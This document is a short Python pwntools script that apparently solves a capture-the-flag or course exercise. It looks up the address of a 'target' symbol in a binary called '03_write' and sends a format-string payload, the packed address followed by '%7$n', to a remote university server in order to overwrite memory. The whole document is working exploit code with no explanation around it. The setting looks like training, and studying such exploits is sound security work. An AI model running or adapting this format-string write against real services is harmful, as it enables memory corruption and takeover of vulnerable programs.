from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25193

s = process('./program/03_write', shell=True)

elf = ELF('./program/03_write')
target_addr = elf.symbols['target']

print(f"Target address: {hex(target_addr)}")

target_addr_bytes = p32(target_addr)
print(f"Target address bytes: {target_addr_bytes}")

s = remote(SERVER, PORT, timeout=9999)
s.sendline(target_addr_bytes + b'.%7$n')
response = s.recv().decode(errors='ignore')
s.close()
print(response)